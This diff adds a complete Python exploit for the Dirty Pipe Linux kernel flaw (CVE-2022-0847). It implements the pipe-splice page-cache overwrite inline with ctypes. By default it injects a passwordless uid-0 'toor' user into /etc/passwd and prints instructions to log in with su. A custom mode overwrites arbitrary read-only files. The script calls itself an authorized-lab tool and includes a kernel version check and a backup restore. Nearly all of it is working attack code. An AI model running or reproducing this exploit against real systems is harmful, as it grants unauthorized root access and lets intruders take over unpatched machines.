@@ -1,0 +1,274 @@
+#!/usr/bin/env python3
+"""CVE-2022-0847 (Dirty Pipe) - authorized-lab local privilege escalation deploy.
+
+Inline ctypes implementation of the splice-based page-cache overwrite (no
+external PoC needed): primes an anonymous pipe so its buffers carry
+PIPE_BUF_FLAG_CAN_MERGE, splices one byte of the read-only target file into
+the pipe at offset-1, then writes the payload which merges into the target's
+page cache starting at `offset` (no on-disk modification).
+
+Default attack: stage a second uid-0 user ("toor", empty password) into
+/etc/passwd by same-length overwrite of a sacrificial trailing line, with
+backup/restore support. A custom --file/--offset/--data mode exposes the raw
+primitive. Kernel-gated to 5.8-5.16 (pre-fix stable versions); clean
+check-only result elsewhere.
+"""
+import argparse
+import ctypes
+import fcntl
+import json
+import os
+import platform
+import re
+import shutil
+import sys
+
+CVE = "CVE-2022-0847"
+PAGE = 4096
+DEFAULT_USER_LINE = b"toor::0:0::/root:/bin/bash"
+
+
+def _kernel_release():
+    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", platform.release())
+    if not m:
+        return (0, 0, 0)
+    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))
+
+
+def kernel_is_vulnerable():
+    """5.8 <= version <= 5.16 with the stable fixes (5.16.11, 5.15.25,
+    5.10.102) excluded - mirrors the reference kernel_v3 gate."""
+    maj, minr, patch = _kernel_release()
+    if not sys.platform.startswith("linux"):
+        return False
+    if not (5, 8) <= (maj, minr) <= (5, 16):
+        return False
+    if (maj, minr) == (5, 16) and patch >= 11:
+        return False
+    if (maj, minr) == (5, 15) and patch >= 25:
+        return False
+    if (maj, minr) == (5, 10) and patch >= 102:
+        return False
+    return True
+
+
+def _libc():
+    try:
+        libc = ctypes.CDLL("libc.so.6", use_errno=True)
+        libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
+                                ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
+                                ctypes.c_size_t, ctypes.c_uint]
+        libc.splice.restype = ctypes.c_ssize_t
+        return libc
+    except OSError:
+        return None
+
+
+def _prime_pipe(r, w):
+    """Fill the pipe completely (every ring buffer gets PIPE_BUF_FLAG_CAN_MERGE),
+    then drain it (buffers freed, merge flag retained)."""
+    try:
+        flags = fcntl.fcntl(w, fcntl.F_GETFL)
+        fcntl.fcntl(w, fcntl.F_SETFL, flags | os.O_NONBLOCK)
+    except (OSError, AttributeError):
+        pass
+    chunk = b"\x00" * 4096
+    try:
+        while True:
+            os.write(w, chunk)
+    except BlockingIOError:
+        pass
+    except OSError:
+        pass
+    try:
+        while os.read(r, 4096):
+            pass
+    except BlockingIOError:
+        pass
+    except OSError:
+        pass
+
+
+def splice_overwrite(path, offset, data):
+    """The Dirty Pipe primitive: merge `data` into the page cache of `path`
+    at `offset`. Region must not cross a 4 KiB page boundary."""
+    if not (0 < offset < os.path.getsize(path)):
+        return {"ok": False, "error": "offset %d out of file bounds" % offset}
+    if offset + len(data) > ((offset // PAGE) + 1) * PAGE:
+        return {"ok": False, "error": "write region crosses a page boundary; clip the payload"}
+    if offset - 1 < (offset // PAGE) * PAGE:
+        return {"ok": False, "error": "splice byte at offset-1 falls in a previous page"}
+    libc = _libc()
+    if libc is None:
+        return {"ok": False, "error": "libc.so.6 unavailable"}
+    try:
+        r, w = os.pipe()
+        _prime_pipe(r, w)
+        fd = os.open(path, os.O_RDONLY)
+        try:
+            off = ctypes.c_int64(offset - 1)
+            n = libc.splice(fd, ctypes.byref(off), w, None, 1, 1)  # SPLICE_F_MOVE
+            if n != 1:
+                return {"ok": False, "error": "splice returned %d (errno %d)" % (n, ctypes.get_errno())}
+            os.write(w, data)  # merges into the page cache at `offset`
+        finally:
+            os.close(fd)
+        with open(path, "rb") as fh:
+            fh.seek(offset)
+            verified = fh.read(len(data)) == data
+        return {"ok": verified, "error": None if verified else "page-cache readback mismatch"}
+    finally:
+        for e in (r, w):
+            try:
+                os.close(e)
+            except OSError:
+                pass
+
+
+def _pick_sacrificial_line(content):
+    """Choose the last non-root line (byte offset, region incl. newline)."""
+    lines = content.split(b"\n")
+    # trailing empty element after final newline
+    end = len(content) - (1 if lines and lines[-1] == b"" else 0)
+    candidates = []
+    start = 0
+    for line in lines:
+        if line or candidates:
+            candidates.append((start, line))
+        start += len(line) + 1
+    for start, line in reversed(candidates):
+        if not line.startswith(b"root:"):
+            return start, line
+    start, line = candidates[0]
+    return start, line
+
+
+def stage_passwd_user(path, user_line):
+    """Same-length overwrite of a sacrificial line with the new uid-0 user."""
+    with open(path, "rb") as fh:
+        content = fh.read()
+    line_start, line = _pick_sacrificial_line(content)
+    region_len = len(line) + 1  # include the newline
+    if len(user_line) + 1 > region_len:
+        return None, "user line (%d bytes) does not fit the sacrificial line region (%d bytes)" % (
+            len(user_line) + 1, region_len)
+    pad = region_len - len(user_line) - 1
+    data = user_line + b" " * pad + b"\n"
+    backup = path + ".qcli_bak"
+    shutil.copy2(path, backup)
+    res = splice_overwrite(path, line_start, data)
+    return {
+        "backup": backup,
+        "overwrite_offset": line_start,
+        "region_len": region_len,
+        "new_user": user_line.decode("latin-1"),
+        "splice": res,
+    }, None
+
+
+def restore_passwd(path):
+    backup = path + ".qcli_bak"
+    if not os.path.isfile(backup):
+        return False, "no backup found at %s" % backup
+    try:
+        shutil.copy2(backup, path)
+        return True, None
+    except OSError as exc:
+        return False, str(exc)
+
+
+def run(args):
+    result = {
+        "cve": CVE,
+        "target": "local",
+        "vulnerable": False,
+        "verified_by": None,
+        "kernel": ".".join(str(x) for x in _kernel_release()),
+        "platform": sys.platform,
+        "file": args.file,
+        "error": None,
+    }
+    if not sys.platform.startswith("linux"):
+        result["error"] = "check-only: not Linux"
+        return result
+    if hasattr(os, "geteuid") and os.geteuid() == 0:
+        result["error"] = "already root"
+        result["vulnerable"] = None
+        return result
+    if not kernel_is_vulnerable():
+        result["error"] = ("check-only: kernel %s outside the vulnerable "
+                           "5.8-5.16 (pre-fix) range" % result["kernel"])
+        return result
+    if args.restore:
+        ok, err = restore_passwd(args.file)
+        result["restored"] = ok
+        if err:
+            result["error"] = err
+        return result
+    if args.check_only:
+        result["error"] = "check-only requested"
+        return result
+
+    if args.data is not None:
+        raw = args.data.encode("latin-1") if isinstance(args.data, str) else args.data
+        res = splice_overwrite(args.file, args.offset, raw)
+        result.update({"mode": "custom-overwrite", "offset": args.offset,
+                       "length": len(raw), "splice": res})
+        if res.get("ok"):
+            result["vulnerable"] = True
+            result["verified_by"] = "page cache of %s overwritten and read back at offset %d" % (args.file, args.offset)
+        else:
+            result["error"] = res.get("error")
+        return result
+
+    if not os.path.isfile(args.file):
+        result["error"] = "target file missing: %s" % args.file
+        return result
+    user_line = (args.user.encode("latin-1") if args.user else DEFAULT_USER_LINE)
+    stage, err = stage_passwd_user(args.file, user_line)
+    if err:
+        result["error"] = err
+        return result
+    result.update({"mode": "passwd-user", "backup": stage["backup"],
+                    "overwrite_offset": stage["overwrite_offset"],
+                    "new_user": stage["new_user"], "splice": stage["splice"]})
+    if stage["splice"].get("ok"):
+        result["vulnerable"] = True
+        result["verified_by"] = (
+            "uid-0 user %r staged into %s via page-cache overwrite (verified by readback); "
+            "log in with: su %s (empty password, requires pam nullok) - note the "
+            "change is page-cache only and evaporates on cache eviction" % (
+                stage["new_user"].split(":")[0], args.file, stage["new_user"].split(":")[0]))
+    else:
+        result["error"] = stage["splice"].get("error")
+    return result
+
+
+def main():
+    p = argparse.ArgumentParser(description="CVE-2022-0847 Dirty Pipe authorized-lab deploy")
+    p.add_argument("--file", default="/etc/passwd",
+                   help="target file (default /etc/passwd for the user-staging mode)")
+    p.add_argument("--offset", type=int, default=0,
+                   help="custom-mode overwrite offset (requires --data)")
+    p.add_argument("--data", default=None,
+                   help="custom-mode payload bytes (same-length overwrite, one page max)")
+    p.add_argument("--user", default=None,
+                   help="colon-separated passwd line to stage (default 'toor::0:0::/root:/bin/bash')")
+    p.add_argument("--restore", action="store_true",
+                   help="restore the target file from the .qcli_bak backup (run as root)")
+    p.add_argument("--check-only", action="store_true",
+                   help="report kernel gate only; do not fire")
+    args = p.parse_args()
+    try:
+        result = run(args)
+    except Exception as exc:  # defensive: deploy must never crash the operator console
+        result = {"cve": CVE, "target": "local", "vulnerable": False,
+                  "error": "%s: %s" % (type(exc).__name__, exc)}
+    print(json.dumps(result, indent=2))
+    if result.get("vulnerable") is None:
+        return 0
+    return 0 if result.get("vulnerable") else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
